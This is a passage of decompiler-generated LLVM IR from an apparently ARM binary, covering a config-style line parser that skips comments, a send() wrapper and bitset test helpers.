dec_label_pc_1308c.preheader:                     ; preds = %dec_label_pc_12e8c, %dec_label_pc_12ea0
  %v0_1309426 = phi i32 [ %v3_12e94, %dec_label_pc_12e8c ], [ %v3_12ea8, %dec_label_pc_12ea0 ]
  %v2_12f00 = ptrtoint i32* %stack_var_-28 to i32
  %v3_12f9c = inttoptr i32 %tmp to i8*
  store i32 %v2_12e50, i32* %r0.global-to-local, align 4
  store i32 %v0_1309426, i32* %r2.global-to-local, align 4
  %v3_1309866 = call i32 @function_e500(i32 %v2_12e50, i32 128, i32 %v0_1309426)
  store i32 %v3_1309866, i32* %r0.global-to-local, align 4
  %v2_1309c68 = icmp eq i32 %v3_1309866, 0
  store i32 %v2_12e50, i32* @r4, align 4
  br i1 %v2_1309c68, label %dec_label_pc_130ac, label %dec_label_pc_12ebc.preheader.lr.ph

dec_label_pc_12ebc.preheader.lr.ph:               ; preds = %dec_label_pc_1308c.preheader
  %v1_12ebc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_12ebc.preheader

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12ec8
  %v1_12eb8 = add i32 %v0_12eb8, 1
  store i32 %v1_12eb8, i32* %r0.global-to-local, align 4
  %v1_12ebc = inttoptr i32 %v1_12eb8 to i8*
  %v2_12ebc = load i8, i8* %v1_12ebc, align 1
  %v3_12ebc = zext i8 %v2_12ebc to i32
  store i32 %v3_12ebc, i32* %r2.global-to-local, align 4
  %v2_12ec0 = icmp eq i8 %v2_12ebc, 0
  br i1 %v2_12ec0, label %dec_label_pc_12edc, label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12ec8.lr.ph, %dec_label_pc_12eb8
  %v0_12eb8 = phi i32 [ %v2_12e50, %dec_label_pc_12ec8.lr.ph ], [ %v1_12eb8, %dec_label_pc_12eb8 ]
  %v1_12ed0 = phi i32 [ %v3_12ebc13, %dec_label_pc_12ec8.lr.ph ], [ %v3_12ebc, %dec_label_pc_12eb8 ]
  %v3_12ed0 = mul nuw nsw i32 %v1_12ed0, 2
  %v4_12ed0 = add i32 %v3_12ed0, %v2_12ecc.pre
  %v5_12ed0 = inttoptr i32 %v4_12ed0 to i8*
  %v6_12ed0 = load i8, i8* %v5_12ed0, align 1
  %v1_12ed4 = and i8 %v6_12ed0, 32
  %v2_12ed4 = icmp eq i8 %v1_12ed4, 0
  br i1 %v2_12ed4, label %dec_label_pc_12edc, label %dec_label_pc_12eb8

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12eb8, %dec_label_pc_12ec8, %dec_label_pc_12ebc.preheader
  %v0_12f7435 = phi i32 [ %v2_12e50, %dec_label_pc_12ebc.preheader ], [ %v1_12eb8, %dec_label_pc_12eb8 ], [ %v0_12eb8, %dec_label_pc_12ec8 ]
  %v0_12ef0 = phi i32 [ %v3_12ebc13, %dec_label_pc_12ebc.preheader ], [ %v3_12ebc, %dec_label_pc_12eb8 ], [ %v1_12ed0, %dec_label_pc_12ec8 ]
  %v7_12edc = icmp eq i32 %v0_12ef0, 10
  br i1 %v7_12edc, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_12edc
  %v3_12ee0 = icmp eq i32 %v0_12ef0, 0
  br i1 %v3_12ee0, label %bb55, label %dec_label_pc_12ef0

.thread3:                                         ; preds = %dec_label_pc_12edc
  br label %dec_label_pc_1308c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_1308c.backedge

dec_label_pc_1308c.backedge:                      ; preds = %dec_label_pc_13068, %dec_label_pc_13080, %bb55, %dec_label_pc_13000, %.thread3, %dec_label_pc_12ef0
  %v0_13094.pre = load i32, i32* @sl, align 4
  store i32 %v2_12e50, i32* %r0.global-to-local, align 4
  store i32 %v0_13094.pre, i32* %r2.global-to-local, align 4
  %v3_13098 = call i32 @function_e500(i32 %v2_12e50, i32 128, i32 %v0_13094.pre)
  store i32 %v3_13098, i32* %r0.global-to-local, align 4
  %v2_1309c = icmp eq i32 %v3_13098, 0
  store i32 %v2_12e50, i32* @r4, align 4
  br i1 %v2_1309c, label %dec_label_pc_130ac, label %dec_label_pc_12ebc.preheader

dec_label_pc_12ef0:                               ; preds = %bb
  %v7_12ef0 = icmp eq i32 %v0_12ef0, 35
  br i1 %v7_12ef0, label %dec_label_pc_1308c.backedge, label %dec_label_pc_12f74

dec_label_pc_12f00:                               ; preds = %bb58
  store i32 %v2_12f00, i32* %r2.global-to-local, align 4
  %v4_12f04 = mul i32 %storemerge, 4
  %v5_12f04 = add i32 %v4_12f04, %v2_12f00
  %v2_12f08 = add i32 %v5_12f04, -36
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 %v0_12f08, i32* %v3_12f08, align 4
  %v0_12f1415 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f1416 = inttoptr i32 %v0_12f1415 to i8*
  %v2_12f1417 = load i8, i8* %v1_12f1416, align 1
  %v3_12f1418 = zext i8 %v2_12f1417 to i32
  store i32 %v3_12f1418, i32* %r2.global-to-local, align 4
  %v2_12f1819 = icmp eq i8 %v2_12f1417, 0
  br i1 %v2_12f1819, label %dec_label_pc_12f48.preheader, label %dec_label_pc_12f20.lr.ph

dec_label_pc_12f20.lr.ph:                         ; preds = %dec_label_pc_12f00
  %v2_12f24.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %dec_label_pc_12f20

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12f34
  %v1_12f10 = add i32 %v0_12f10, 1
  store i32 %v1_12f10, i32* %r0.global-to-local, align 4
  %v1_12f14 = inttoptr i32 %v1_12f10 to i8*
  %v2_12f14 = load i8, i8* %v1_12f14, align 1
  %v3_12f14 = zext i8 %v2_12f14 to i32
  store i32 %v3_12f14, i32* %r2.global-to-local, align 4
  %v2_12f18 = icmp eq i8 %v2_12f14, 0
  br i1 %v2_12f18, label %dec_label_pc_12f48.preheader, label %dec_label_pc_12f20

dec_label_pc_12f20:                               ; preds = %dec_label_pc_12f20.lr.ph, %dec_label_pc_12f10
  %v0_12f10 = phi i32 [ %v0_12f1415, %dec_label_pc_12f20.lr.ph ], [ %v1_12f10, %dec_label_pc_12f10 ]
  %v0_12f34 = phi i32 [ %v3_12f1418, %dec_label_pc_12f20.lr.ph ], [ %v3_12f14, %dec_label_pc_12f10 ]
  %v3_12f28 = mul nuw nsw i32 %v0_12f34, 2
  %v4_12f28 = add i32 %v3_12f28, %v2_12f24.pre
  %v5_12f28 = inttoptr i32 %v4_12f28 to i8*
  %v6_12f28 = load i8, i8* %v5_12f28, align 1
  %v1_12f2c = and i8 %v6_12f28, 32
  %v2_12f2c = icmp eq i8 %v1_12f2c, 0
  br i1 %v2_12f2c, label %dec_label_pc_12f34, label %dec_label_pc_12f48.preheader

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f20
  %v7_12f34 = icmp eq i32 %v0_12f34, 10
  br i1 %v7_12f34, label %dec_label_pc_12f48.preheader, label %dec_label_pc_12f10

dec_label_pc_12f48.preheader:                     ; preds = %dec_label_pc_12f34, %dec_label_pc_12f20, %dec_label_pc_12f10, %dec_label_pc_12f00
  %v0_12f4820 = phi i32 [ %v0_12f1415, %dec_label_pc_12f00 ], [ %v0_12f10, %dec_label_pc_12f34 ], [ %v0_12f10, %dec_label_pc_12f20 ], [ %v1_12f10, %dec_label_pc_12f10 ]
  %v1_12f4821 = inttoptr i32 %v0_12f4820 to i8*
  %v2_12f4822 = load i8, i8* %v1_12f4821, align 1
  %v3_12f4823 = zext i8 %v2_12f4822 to i32
  store i32 %v3_12f4823, i32* %r2.global-to-local, align 4
  %v2_12f4c24 = icmp eq i8 %v2_12f4822, 0
  br i1 %v2_12f4c24, label %dec_label_pc_12f70, label %dec_label_pc_12f54

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f54, %dec_label_pc_12f68
  %v3_12f44 = inttoptr i32 %v2_12f44 to i8*
  store i8 0, i8* %v3_12f44, align 1
  %v4_12f44 = load i32, i32* %r0.global-to-local, align 4
  %v5_12f44 = add i32 %v4_12f44, 1
  store i32 %v5_12f44, i32* %r0.global-to-local, align 4
  %v1_12f48 = inttoptr i32 %v5_12f44 to i8*
  %v2_12f48 = load i8, i8* %v1_12f48, align 1
  %v3_12f48 = zext i8 %v2_12f48 to i32
  store i32 %v3_12f48, i32* %r2.global-to-local, align 4
  %v2_12f4c = icmp eq i8 %v2_12f48, 0
  br i1 %v2_12f4c, label %dec_label_pc_12f70, label %dec_label_pc_12f54

dec_label_pc_12f54:                               ; preds = %dec_label_pc_12f48.preheader, %dec_label_pc_12f40
  %v0_12f68 = phi i32 [ %v3_12f48, %dec_label_pc_12f40 ], [ %v3_12f4823, %dec_label_pc_12f48.preheader ]
  %v2_12f44 = phi i32 [ %v5_12f44, %dec_label_pc_12f40 ], [ %v0_12f4820, %dec_label_pc_12f48.preheader ]
  %v2_12f58 = load i32, i32* @global_var_1f4a0, align 4
  %v3_12f5c = mul nuw nsw i32 %v0_12f68, 2
  %v4_12f5c = add i32 %v2_12f58, %v3_12f5c
  %v5_12f5c = inttoptr i32 %v4_12f5c to i8*
  %v6_12f5c = load i8, i8* %v5_12f5c, align 1
  %v1_12f60 = and i8 %v6_12f5c, 32
  %v2_12f60 = icmp eq i8 %v1_12f60, 0
  br i1 %v2_12f60, label %dec_label_pc_12f68, label %dec_label_pc_12f40

dec_label_pc_12f68:                               ; preds = %dec_label_pc_12f54
  %v7_12f68 = icmp eq i32 %v0_12f68, 10
  br i1 %v7_12f68, label %dec_label_pc_12f40, label %dec_label_pc_12f70

dec_label_pc_12f70:                               ; preds = %dec_label_pc_12f40, %dec_label_pc_12f68, %dec_label_pc_12f48.preheader
  %v0_12f7434 = phi i32 [ %v0_12f4820, %dec_label_pc_12f48.preheader ], [ %v5_12f44, %dec_label_pc_12f40 ], [ %v2_12f44, %dec_label_pc_12f68 ]
  %v0_12f70 = load i32, i32* @r8, align 4
  %v1_12f70 = add i32 %v0_12f70, 1
  br label %dec_label_pc_12f74

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12ef0, %dec_label_pc_12f70
  %storemerge = phi i32 [ %v1_12f70, %dec_label_pc_12f70 ], [ 0, %dec_label_pc_12ef0 ]
  %v0_12f08 = phi i32 [ %v0_12f7434, %dec_label_pc_12f70 ], [ %v0_12f7435, %dec_label_pc_12ef0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_12f74 = inttoptr i32 %v0_12f08 to i8*
  %v2_12f74 = load i8, i8* %v1_12f74, align 1
  %v3_12f74 = zext i8 %v2_12f74 to i32
  %v2_12f78 = icmp eq i8 %v2_12f74, 0
  br i1 %v2_12f78, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_12f74
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_12f74, %bb56
  %v0_12f88.pr = phi i32 [ %v3_12f74, %dec_label_pc_12f74 ], [ 1, %bb56 ]
  %v1_12f80 = add i32 %storemerge, -4
  %v3_12f80 = sub i32 3, %storemerge
  %v4_12f80 = and i32 %v3_12f80, %storemerge
  %v5_12f80 = icmp slt i32 %v4_12f80, 0
  %v6_12f80 = icmp slt i32 %v1_12f80, 0
  %v7_12f80 = icmp eq i32 %storemerge, 4
  %v3_12f84 = xor i1 %v6_12f80, %v5_12f80
  %v4_12f84 = or i1 %v7_12f80, %v3_12f84
  br i1 %v4_12f84, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_12f90

bb58:                                             ; preds = %bb57
  %v2_12f88 = icmp eq i32 %v0_12f88.pr, 0
  br i1 %v2_12f88, label %dec_label_pc_12f90, label %dec_label_pc_12f00

dec_label_pc_12f90:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1700c.578 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_12f9c = call i32 @function_13640(i8* %v3_12f9c, i32 ptrtoint ([11 x i8]* @global_var_1700c.578 to i32))
  store i32 %v4_12f9c, i32* %r0.global-to-local, align 4
  %v2_12fa0 = icmp eq i32 %v4_12f9c, 0
  br i1 %v2_12fa0, label %dec_label_pc_12fc8.preheader, label %dec_label_pc_12fec

dec_label_pc_12fc8.preheader:                     ; preds = %dec_label_pc_12f90
  br label %dec_label_pc_12fc8

dec_label_pc_12fb0:                               ; preds = %dec_label_pc_12fe0
  %v1_12fb0 = add i32 %v5_12fd0, -36
  %v2_12fb0 = inttoptr i32 %v1_12fb0 to i32*
  %v3_12fb0 = load i32, i32* %v2_12fb0, align 4
  store i32 %v3_12fb0, i32* %r0.global-to-local, align 4
  %v1_12fb4 = call i32 @function_f170(i32 %v3_12fb0)
  store i32 %v1_12fb4, i32* %r0.global-to-local, align 4
  %v0_12fbc = load i32, i32* @r4, align 4
  %v1_12fbc = add i32 %v0_12fbc, 1
  store i32 %v1_12fbc, i32* %r2.global-to-local, align 4
  %v5_12fc0 = mul i32 %v0_12fbc, 4
  %v6_12fc0 = add i32 %v5_12fc0, ptrtoint (i32* @global_var_21db0.423 to i32)
  %v7_12fc0 = inttoptr i32 %v6_12fc0 to i32*
  store i32 %v1_12fb4, i32* %v7_12fc0, align 4
  %v0_12fc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12fc4 = load i32, i32* @r7, align 4
  %v2_12fc4 = inttoptr i32 %v1_12fc4 to i32*
  store i32 %v0_12fc4, i32* %v2_12fc4, align 4
  %v0_12fcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12fc8.preheader, %dec_label_pc_12fb0
  %v0_12fd8 = phi i32 [ 1, %dec_label_pc_12fc8.preheader ], [ %v0_12fcc.pre, %dec_label_pc_12fb0 ]
  store i32 %v2_12f00, i32* %r2.global-to-local, align 4
  %v1_12fcc = load i32, i32* @r8, align 4
  %v2_12fcc = sub i32 %v0_12fd8, %v1_12fcc
  %v4_12fcc = xor i32 %v1_12fcc, %v0_12fd8
  %v5_12fcc = xor i32 %v2_12fcc, %v0_12fd8
  %v6_12fcc = and i32 %v5_12fcc, %v4_12fcc
  %v7_12fcc = icmp slt i32 %v6_12fcc, 0
  %v8_12fcc = icmp slt i32 %v2_12fcc, 0
  %v4_12fd0 = mul i32 %v0_12fd8, 4
  %v5_12fd0 = add i32 %v4_12fd0, %v2_12f00
  store i32 ptrtoint (i32* @global_var_21dbc.420 to i32), i32* @r7, align 4
  %v1_12fd8 = add i32 %v0_12fd8, 1
  store i32 %v1_12fd8, i32* @r5, align 4
  %v2_12fdc = xor i1 %v8_12fcc, %v7_12fcc
  br i1 %v2_12fdc, label %dec_label_pc_12fe0, label %dec_label_pc_12fec

dec_label_pc_12fe0:                               ; preds = %dec_label_pc_12fc8
  %v2_12fe0 = load i32, i32* @global_var_21dbc.420, align 4
  store i32 %v2_12fe0, i32* @r4, align 4
  %v7_12fe8 = icmp slt i32 %v2_12fe0, 3
  br i1 %v7_12fe8, label %dec_label_pc_12fb0, label %dec_label_pc_12fec

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fc8, %dec_label_pc_12fe0, %dec_label_pc_12f90
  %v0_12fec = load i32, i32* @r6, align 4
  store i32 %v0_12fec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17018.581 to i32), i32* @r1, align 4
  %v3_12ff4 = inttoptr i32 %v0_12fec to i8*
  %v4_12ff4 = call i32 @function_13640(i8* %v3_12ff4, i32 ptrtoint ([7 x i8]* @global_var_17018.581 to i32))
  store i32 %v4_12ff4, i32* %r0.global-to-local, align 4
  %v2_12ff8 = icmp eq i32 %v4_12ff4, 0
  br i1 %v2_12ff8, label %dec_label_pc_13030.preheader, label %dec_label_pc_13000

dec_label_pc_13000:                               ; preds = %dec_label_pc_12fec
  %v0_13000 = load i32, i32* @r6, align 4
  store i32 %v0_13000, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_17020.583 to i32), i32* @r1, align 4
  %v3_13008 = inttoptr i32 %v0_13000 to i8*
  %v4_13008 = call i32 @function_13640(i8* %v3_13008, i32 ptrtoint ([7 x i8]* @global_var_17020.583 to i32))
  store i32 %v4_13008, i32* %r0.global-to-local, align 4
  %v2_1300c = icmp eq i32 %v4_13008, 0
  br i1 %v2_1300c, label %dec_label_pc_13030.preheader, label %dec_label_pc_1308c.backedge

dec_label_pc_13030.preheader:                     ; preds = %dec_label_pc_12fec, %dec_label_pc_13000
  store i32 ptrtoint (i32* @global_var_21dc0.558 to i32), i32* @r4, align 4
  %v2_1303460 = load i32, i32* @global_var_21dc0.558, align 4
  store i32 ptrtoint (i32* @global_var_21da0.562 to i32), i32* @r5, align 4
  %v1_1304063 = add i32 %v2_1303460, -1
  store i32 %v1_1304063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_1303460, 1
  br i1 %tmp5964, label %dec_label_pc_13048, label %dec_label_pc_13018

dec_label_pc_13018:                               ; preds = %dec_label_pc_13030.preheader, %dec_label_pc_13018
  %v1_1304065 = phi i32 [ %v1_13040, %dec_label_pc_13018 ], [ %v1_1304063, %dec_label_pc_13030.preheader ]
  %v4_13018 = mul i32 %v1_1304065, 4
  %v5_13018 = add i32 %v4_13018, ptrtoint (i32* @global_var_21da0.562 to i32)
  %v6_13018 = inttoptr i32 %v5_13018 to i32*
  %v7_13018 = load i32, i32* %v6_13018, align 4
  store i32 %v7_13018, i32* %r0.global-to-local, align 4
  store i32 %v1_1304065, i32* @global_var_21dc0.558, align 4
  %v1_13020 = call i32 @function_fa5c(i32 %v7_13018)
  store i32 %v1_13020, i32* %r0.global-to-local, align 4
  %v0_13024 = load i32, i32* @r4, align 4
  %v1_13024 = inttoptr i32 %v0_13024 to i32*
  %v2_13024 = load i32, i32* %v1_13024, align 4
  %v1_1302c = load i32, i32* @r5, align 4
  %v5_1302c = mul i32 %v2_13024, 4
  %v6_1302c = add i32 %v1_1302c, %v5_1302c
  %v7_1302c = inttoptr i32 %v6_1302c to i32*
  store i32 0, i32* %v7_1302c, align 4
  store i32 ptrtoint (i32* @global_var_21dc0.558 to i32), i32* @r4, align 4
  %v2_13034 = load i32, i32* @global_var_21dc0.558, align 4
  store i32 ptrtoint (i32* @global_var_21da0.562 to i32), i32* @r5, align 4
  %v1_13040 = add i32 %v2_13034, -1
  store i32 %v1_13040, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_13034, 1
  br i1 %tmp59, label %dec_label_pc_13048, label %dec_label_pc_13018

dec_label_pc_13048:                               ; preds = %dec_label_pc_13018, %dec_label_pc_13030.preheader
  br label %dec_label_pc_13068

dec_label_pc_13050:                               ; preds = %dec_label_pc_13080
  %v1_13050 = add i32 %v5_13070, -36
  %v2_13050 = inttoptr i32 %v1_13050 to i32*
  %v3_13050 = load i32, i32* %v2_13050, align 4
  store i32 %v3_13050, i32* %r0.global-to-local, align 4
  %v1_13054 = call i32 @function_f170(i32 %v3_13050)
  store i32 %v1_13054, i32* %r0.global-to-local, align 4
  %v0_1305c = load i32, i32* @r4, align 4
  %v1_1305c = add i32 %v0_1305c, 1
  store i32 %v1_1305c, i32* %r2.global-to-local, align 4
  %v5_13060 = mul i32 %v0_1305c, 4
  %v6_13060 = add i32 %v5_13060, ptrtoint (i32* @global_var_21da0.562 to i32)
  %v7_13060 = inttoptr i32 %v6_13060 to i32*
  store i32 %v1_13054, i32* %v7_13060, align 4
  %v0_13064 = load i32, i32* %r2.global-to-local, align 4
  %v1_13064 = load i32, i32* @r6, align 4
  %v2_13064 = inttoptr i32 %v1_13064 to i32*
  store i32 %v0_13064, i32* %v2_13064, align 4
  %v0_1306c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %dec_label_pc_13048, %dec_label_pc_13050
  %v0_13078 = phi i32 [ 1, %dec_label_pc_13048 ], [ %v0_1306c.pre, %dec_label_pc_13050 ]
  store i32 %v2_12f00, i32* %r2.global-to-local, align 4
  %v1_1306c = load i32, i32* @r8, align 4
  %v2_1306c = sub i32 %v0_13078, %v1_1306c
  %v4_1306c = xor i32 %v1_1306c, %v0_13078
  %v5_1306c = xor i32 %v2_1306c, %v0_13078
  %v6_1306c = and i32 %v5_1306c, %v4_1306c
  %v7_1306c = icmp slt i32 %v6_1306c, 0
  %v8_1306c = icmp slt i32 %v2_1306c, 0
  %v4_13070 = mul i32 %v0_13078, 4
  %v5_13070 = add i32 %v4_13070, %v2_12f00
  store i32 ptrtoint (i32* @global_var_21dc0.558 to i32), i32* @r6, align 4
  %v1_13078 = add i32 %v0_13078, 1
  store i32 %v1_13078, i32* @r5, align 4
  %v2_1307c = xor i1 %v8_1306c, %v7_1306c
  br i1 %v2_1307c, label %dec_label_pc_13080, label %dec_label_pc_1308c.backedge

dec_label_pc_13080:                               ; preds = %dec_label_pc_13068
  %v2_13080 = load i32, i32* @global_var_21dc0.558, align 4
  store i32 %v2_13080, i32* @r4, align 4
  %v7_13088 = icmp slt i32 %v2_13080, 4
  br i1 %v7_13088, label %dec_label_pc_13050, label %dec_label_pc_1308c.backedge

dec_label_pc_12ebc.preheader:                     ; preds = %dec_label_pc_12ebc.preheader.lr.ph, %dec_label_pc_1308c.backedge
  store i32 %v2_12e50, i32* %r0.global-to-local, align 4
  %v2_12ebc12 = load i8, i8* %v1_12ebc11, align 4
  %v3_12ebc13 = zext i8 %v2_12ebc12 to i32
  store i32 %v3_12ebc13, i32* %r2.global-to-local, align 4
  %v2_12ec014 = icmp eq i8 %v2_12ebc12, 0
  br i1 %v2_12ec014, label %dec_label_pc_12edc, label %dec_label_pc_12ec8.lr.ph

dec_label_pc_12ec8.lr.ph:                         ; preds = %dec_label_pc_12ebc.preheader
  %v2_12ecc.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_130ac:                               ; preds = %dec_label_pc_1308c.backedge, %dec_label_pc_1308c.preheader
  %v0_130ac = load i32, i32* @sl, align 4
  store i32 %v0_130ac, i32* %r0.global-to-local, align 4
  %v1_130b0 = inttoptr i32 %v0_130ac to i8*
  %v2_130b0 = call i32 @function_cc14(i8* %v1_130b0)
  store i32 %v2_130b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_130c4

dec_label_pc_130b8:                               ; preds = %dec_label_pc_12ea0
  %v0_130b8 = call i32 @function_11004()
  store i32 %v0_130b8, i32* %r0.global-to-local, align 4
  %v2_130c0 = inttoptr i32 %v0_130b8 to i32*
  store i32 3, i32* %v2_130c0, align 4
  br label %dec_label_pc_130c4

dec_label_pc_130c4:                               ; preds = %dec_label_pc_12e4c, %dec_label_pc_130ac, %dec_label_pc_130b8
  store i32 %v2_12e54, i32* @r0, align 4
  %v1_130d4 = call i32 @function_10840()
  store i32 %v1_130d4, i32* %r0.global-to-local, align 4
  store i32 %v6_12e4c, i32* @r5, align 4
  store i32 %v9_12e4c, i32* @r6, align 4
  store i32 %v12_12e4c, i32* @r7, align 4
  store i32 %v15_12e4c, i32* @r8, align 4
  store i32 %v18_12e4c, i32* @sl, align 4
  ret i32 %v1_130d4

; uselistorder directives
  uselistorder i32 %v3_12ebc13, { 2, 1, 0 }
  uselistorder i32 %v2_1306c, { 1, 0 }
  uselistorder i32 %v0_13078, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_13040, { 1, 0 }
  uselistorder i32 %v1_1304065, { 1, 0 }
  uselistorder i32 %v2_12fcc, { 1, 0 }
  uselistorder i32 %v0_12fd8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_12f08, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_12f4820, { 1, 0, 2 }
  uselistorder i32 %v2_12f00, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_12e50, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 4, 2, 3, 5, 1, 8, 6, 7, 9, 17, 10, 16, 11, 13, 12, 0, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 6, 5, 22, 8, 7, 10, 9, 12, 11, 14, 13, 29, 15, 28, 16, 17, 21, 18, 20, 27, 23, 19, 2, 3, 24, 26, 0, 25 }
  uselistorder i32 ()* @function_11004, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 (i32)* @function_fa5c, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15, 14, 18, 17, 16, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_21da0.562 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_21dc0.558, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_21dc0.558 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_21db0.423 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11 }
  uselistorder i32* @global_var_21dbc.420, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_130c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ebc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13068, { 1, 0 }
  uselistorder label %dec_label_pc_13018, { 1, 0 }
  uselistorder label %dec_label_pc_13030.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12fec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fc8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_12f74, { 1, 0 }
  uselistorder label %dec_label_pc_12f70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f54, { 1, 0 }
  uselistorder label %dec_label_pc_12f40, { 1, 0 }
  uselistorder label %dec_label_pc_12f20, { 1, 0 }
  uselistorder label %dec_label_pc_1308c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_12edc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1308c.preheader, { 1, 0 }
}

define i32 @function_13120(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13120:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1315c = call i32 @function_141f0()
  ret i32 %v0_1315c
}

define i32 @function_13168(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13168:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13168 = load i32, i32* @r4, align 4
  store i32 %v3_13168, i32* %stack_var_-8, align 4
  %v5_1316c = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1316c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1316c, -4095
  br i1 %tmp, label %dec_label_pc_1318c, label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13168
  %v0_1317c = call i32 @function_cc08()
  %v0_13180 = load i32, i32* %r4.global-to-local, align 4
  %v1_13180 = sub i32 0, %v0_13180
  %v2_13184 = inttoptr i32 %v0_1317c to i32*
  store i32 %v1_13180, i32* %v2_13184, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13168, %dec_label_pc_1317c
  %v0_1318c = phi i32 [ %v5_1316c, %dec_label_pc_13168 ], [ -1, %dec_label_pc_1317c ]
  %v2_13190 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13190, i32* %r4.global-to-local, align 4
  ret i32 %v0_1318c

; uselistorder directives
  uselistorder i32 %v5_1316c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1318c, { 1, 0 }
}

define i32 @function_13194(i32 %arg1) local_unnamed_addr {
dec_label_pc_13194:
  %v3_13194 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1319c = call i32 @function_ca70()
  %v0_131a0 = load i32, i32* @r4, align 4
  store i32 %v3_13194, i32* @r4, align 4
  %v2_131a8 = call i32 @function_cb18(i32 %v0_1319c, i32 %v0_131a0)
  ret i32 %v2_131a8

; uselistorder directives
  uselistorder i32 ()* @function_ca70, { 0, 2, 1 }
}

define i32 @function_131ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_131ac:
  %v1_131ac = add i32 %arg2, -1
  %v3_131b0 = udiv i32 %v1_131ac, 32
  %v4_131b4 = mul nuw nsw i32 %v3_131b0, 4
  %v5_131b4 = add i32 %v4_131b4, %arg1
  %v6_131b4 = inttoptr i32 %v5_131b4 to i32*
  %v7_131b4 = load i32, i32* %v6_131b4, align 4
  %v1_131b8 = urem i32 %v1_131ac, 32
  %v7_131c0 = shl i32 1, %v1_131b8
  %v8_131c0 = and i32 %v7_131b4, %v7_131c0
  %v10_131c0 = icmp ne i32 %v8_131c0, 0
  %. = zext i1 %v10_131c0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_131ac, { 1, 0 }
}

define i32 @function_131d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_131d0:
  %v1_131d0 = add i32 %arg2, -1
  %v3_131d4 = udiv i32 %v1_131d0, 32
  %v4_131d8 = mul nuw nsw i32 %v3_131d4, 4
